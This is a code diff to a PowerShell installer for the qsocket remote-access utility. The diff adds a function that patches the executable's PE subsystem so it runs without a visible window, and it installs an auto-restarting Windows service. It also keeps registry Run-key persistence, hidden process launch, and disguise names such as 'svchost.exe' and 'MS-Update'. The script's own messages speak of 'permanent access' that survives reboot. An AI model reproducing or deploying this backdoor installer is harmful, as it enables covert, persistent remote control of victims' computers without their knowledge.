@@ -7,8 +7,8 @@
 
 $ERR_LOGS=$null # New-TemporaryFile
 $GITHUB_REPO="https://api.github.com/repos/qsocket"
-$QS_UTIL="qs-netcat"
-$QS_BIN_NAME="qs-netcat.exe"
+$QS_UTIL="qsocket"
+$QS_BIN_NAME="qsock.exe"
 $QS_BIN_HIDDEN_NAME="svchost.exe"
 $QS_SCHEDULED_TASK_NAME="MS-Update"
 $BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gIElOID4gICAgICAgICAgICAgICAgICAgICAgICAgICItXyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgLiAgfCAgLiAgICDjg73gvLzguojZhM2c4LqI4Ly9KSk+PS0gICAgICAgXCAgICAgICAgICAKICAg4Ly844Gk4LKg55uK4LKg4Ly944GkIOKUgD3iiaHOo08pKSAgIF8gICAgICAgIF8gICAgICAgLyAgICAgIDogXCB8IC8gOiAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIAogICBfXyBfIF9fXyAgX19fICAgX19ffCB8IF9fX19ffCB8XyAgICAvICAgICAgICAnLV9fXy0nICAgICAgICAgIOKYnCjinY3htKXinY3KiykpPi0gICAgXCAgICAgIAogIC8gX2AgLyBfX3wvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyBcICAgICAgCiB8IChffCBcX18gXCAoXykgfCAoX198ICAgPCAgX18vIHxfICAgICAgICBfX19fX19ffCB8X19fX19fX19fX19fX19fX19fX19fX19fLS0iIi1MIAogIFxfXywgfF9fXy9cX19fLyBcX19ffF98XF9cX19ffFxfX3wgICAgICAvICAgICAgIEYgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwgCiAgICAgfF98ICAgQ29weXJpZ2h0IChjKSAyMDIzIFFzb2NrZXQgICAgLyAgICAgICBGICAgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTAogIGh0dHBzOi8vZ2l0aHViLmNvbS9xc29ja2V0LyAgICAgICAgICAgLyAgICAgIDonICAgICAnOiAgIOKUgD3iiaHOoygoKCDjgaTil5XZhM2c4peVKeOBpCAgICAgICAgIEYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgT1VUIDwgJy1fX18tJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXy0tIgoK")) | Out-String
@@ -160,6 +160,75 @@ function Download-Qsocket-Util($path)
     }
 }
 
+function Set-PeSubsystemGUI {
+    param(
+        [Parameter(Mandatory = $true, Position = 0)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Path
+    )
+
+    $resolvedPath = (Resolve-Path -LiteralPath $Path -ErrorAction Stop).Path
+    $bytes = [System.IO.File]::ReadAllBytes($resolvedPath)
+
+    # Validate DOS header
+    if ($bytes.Length -lt 64 -or
+        $bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
+        throw "Invalid DOS/PE executable."
+    }
+
+    # Locate PE header
+    $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
+
+    if ($peOffset -lt 64 -or $peOffset -gt ($bytes.Length - 24)) {
+        throw "Invalid PE header offset."
+    }
+
+    # Validate PE signature
+    if ([BitConverter]::ToUInt32($bytes, $peOffset) -ne 0x00004550) {
+        throw "Invalid PE signature."
+    }
+
+    # Locate Optional Header
+    $optionalHeaderOffset = $peOffset + 24
+
+    $optionalHeaderSize = [BitConverter]::ToUInt16(
+        $bytes, $peOffset + 20
+    )
+
+    if ($optionalHeaderSize -lt 70 -or
+        $optionalHeaderOffset + $optionalHeaderSize -gt $bytes.Length) {
+        throw "Invalid Optional Header."
+    }
+
+    # Validate PE32 or PE32+ magic
+    $magic = [BitConverter]::ToUInt16($bytes, $optionalHeaderOffset)
+
+    if ($magic -ne 0x10B -and $magic -ne 0x20B) {
+        throw "Unsupported PE Optional Header format."
+    }
+
+    # Subsystem field offset: Optional Header + 68
+    $subsystemOffset = $optionalHeaderOffset + 68
+
+    $currentSubsystem = [BitConverter]::ToUInt16(
+        $bytes, $subsystemOffset
+    )
+
+    if ($currentSubsystem -eq 2) {
+        Print-Debug "Executable already uses Windows GUI subsystem."
+        return
+    }
+
+    # Set subsystem to Windows GUI (2)
+    $bytes[$subsystemOffset] = 0x02
+    $bytes[$subsystemOffset + 1] = 0x00
+
+    # Save modified executable
+    [System.IO.File]::WriteAllBytes($resolvedPath, $bytes)
+
+    Print-Debug "Subsystem changed from $currentSubsystem to Windows GUI (2)."
+}
+
 function Create-Sceduled-Task($path, $secret)
 {
     Print-Debug "Creating scheduled task..."
@@ -184,7 +253,7 @@ function Create-Sceduled-Task($path, $secret)
 function Create-Run-Key($path, $secret)
 {
     Print-Debug "Adding CurrentVersion\Run registery..."
-    $RUN_CMD="powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`""
+    $RUN_CMD="powershell.exe -WindowStyle Hidden -Command \`"$path -lq $secret\`""
     Print-Debug $RUN_CMD 
     try {
         if(Is-Administrator){
@@ -201,13 +270,107 @@ function Create-Run-Key($path, $secret)
     Print-Debug "Auto-run key added successfully"  
 }
 
+function Install-WindowsService {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$ExePath,
+        [Parameter(Mandatory)]
+        [string]$ServiceName,
+        [string]$DisplayName = $ServiceName,
+        [string]$Description = "Windows service installed by PowerShell",
+        [string]$Arguments
+    )
+
+    # Require Administrator
+    $principal = [Security.Principal.WindowsPrincipal]::new(
+        [Security.Principal.WindowsIdentity]::GetCurrent()
+    )
+
+    if (-not $principal.IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator
+    )) {
+        throw "This function must be run as Administrator."
+    }
+
+    # Validate EXE
+    $ExePath = [System.IO.Path]::GetFullPath($ExePath)
+
+    if (-not (Test-Path -LiteralPath $ExePath -PathType Leaf)) {
+        throw "EXE file not found: $ExePath"
+    }
+
+    # Check whether service already exists
+    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
+        throw "Service '$ServiceName' already exists."
+    }
+
+    # Build service command line
+    $BinaryPathName = $ExePath
+
+    if (-not [string]::IsNullOrWhiteSpace($Arguments)) {
+        $BinaryPathName += " $Arguments"
+    }
+
+    Print-Debug "Binary Path Name: $BinaryPathName"
+    # Create service
+    New-Service `
+        -Name $ServiceName `
+        -BinaryPathName $BinaryPathName `
+        -DisplayName $DisplayName `
+        -Description $Description `
+        -StartupType Automatic | Out-Null
+    
+    # # Set service-specific environment variable
+    # $ServiceRegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
+    #
+    # New-ItemProperty `
+    #   -Path $ServiceRegistryPath `
+    #   -Name Environment `
+    #   -PropertyType MultiString `
+    #   -Value "QS_ARGS='$Arguments'" `
+    #   -Force | Out-Null
+
+
+    # Configure automatic restart on failure
+    sc.exe failure $ServiceName `
+        reset= 86400 `
+        actions= restart/5000/restart/5000/restart/5000 | Out-Null
+
+    if ($LASTEXITCODE -ne 0) {
+        throw "Failed to configure service failure actions."
+    }
+
+    # Configure delayed automatic startup
+    sc.exe config $ServiceName start= delayed-auto | Out-Null
+
+    if ($LASTEXITCODE -ne 0) {
+        throw "Failed to configure delayed automatic startup."
+    }
+
+    # Start service
+    Start-Service -Name $ServiceName | Out-Null
+
+    # Write-Host "Service installed successfully:"
+    # Write-Host "  Name       : $ServiceName"
+    # Write-Host "  Executable : $ExePath"
+    #
+    # if (-not [string]::IsNullOrWhiteSpace($Arguments)) {
+    #     Write-Host "  Arguments  : $Arguments"
+    # }
+    #
+    # Write-Host "  Startup    : Automatic (Delayed)"
+    # Write-Host "  Recovery   : Restart after 5 seconds"
+}
+
+
 function Print-Usage($secret_file)
 {
     Write-Host " `n"
-    Get-Content $secret_file | & $QS_PATH "--qr"
+    Get-Content $secret_file # | & $QS_PATH "--qr"
     Write-Host " `n"
-    Write-Host "# >>> Connect ============> qs-netcat -i -s $SECRET" -ForegroundColor Green
-    Write-Host "# >>> Connect With TOR ===> qs-netcat -T -i -s $SECRET" -ForegroundColor Green
+    Write-Host "# >>> Connect ============> qsock.exe ssh $SECRET" -ForegroundColor Green
+    Write-Host "# >>> Connect With TOR ===> qsock.exe -T ssh $SECRET" -ForegroundColor Green
     Write-Host " `n"
 }
 
@@ -275,19 +438,21 @@ try {
     Print-Fatal "Unable to copy qsocket binaries."
 }
 
+
 try {
     Print-Progress "Testing qsocket binaries"
     $pinfo = New-Object System.Diagnostics.ProcessStartInfo
     $pinfo.FileName = $QS_PATH
-    $pinfo.RedirectStandardError = $true
+    $pinfo.RedirectStandardOutput = $true
     $pinfo.UseShellExecute = $false
     $pinfo.Arguments = "-g"
     $proc = New-Object System.Diagnostics.Process
     $proc.StartInfo = $pinfo
     $proc.Start() | Out-Null
     $proc.WaitForExit()
-    $RAND_SECRET = $proc.StandardError.ReadToEnd()
-    $RAND_SECRET | Out-File -FilePath "$SECRET_FILE"
+    $RAND_SECRET = $proc.StandardOutput.ReadToEnd().Trim()
+    $RAND_SECRET | & $QS_PATH --qr | Out-File -FilePath "$SECRET_FILE"
+    Print-Debug "Random Secret: $RAND_SECRET"
     Print-Ok
 }catch{
     Print-Fail
@@ -303,35 +468,48 @@ if ($SECRET.Length -eq 0) {
 
 if (Is-Administrator) {
   try {
-    Print-Progress "Installing system wide permanent access via schtask"
-    Create-Sceduled-Task $QS_PATH $SECRET
+    Print-Progress "Installing system wide permanent access via SCM service"
+    # Create-Sceduled-Task $QS_PATH ssh $SECRET
+    Install-WindowsService -ExePath $QS_PATH -ServiceName "QsDaemon" -Arguments "-lq $SECRET"
     Print-Ok
     $PERSISTENCE=$true
   }catch{
+    Print-Debug "Exception occurred:"
+    Print-Debug $_.Exception.Message
     Print-Fail
   }
 }
 
-try {
-    Print-Progress "Installing system wide permanent access via registery"
-    Create-Run-Key $QS_PATH $SECRET
-    Print-Ok
-    $PERSISTENCE=$true
-}catch{
-    Print-Fail
+if ($PERSISTENCE -eq $false) {
+    try {
+      Print-Progress "Setting EXE subsystem as GUI"
+      Set-PeSubsystemGUI $QS_PATH
+      Print-Ok
+    }catch {
+      Print-Fail
+    }
+
+    try {
+        Print-Progress "Installing system wide permanent access via registery"
+        Create-Run-Key $QS_PATH $SECRET
+        Print-Ok
+        $PERSISTENCE=$true
+    }catch{
+        Print-Fail
+    }
+
+    try {
+        Print-Progress "Starting qsocket utility"
+        Start-Process $QS_PATH "-lq $SECRET" -WindowStyle Hidden
+        Print-Debug "Path: $QS_PATH -lq $SECRET"
+        Print-Ok
+    }catch{
+        Print-Fail
+    }
 }
 
 if ($PERSISTENCE -eq $false) {
   Print-Warning "Permanent install methods failed! Access will be lost after reboot."
-}
-
-try {
-    Print-Progress "Starting qsocket utility"
-    Print-Debug ("Path: "+(Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME"))
-    Start-Process $QS_PATH "-liqs $SECRET" -WindowStyle Hidden
-    Print-Ok
-}catch{
-    Print-Fail
 }
 
 Print-Usage($SECRET_FILE)
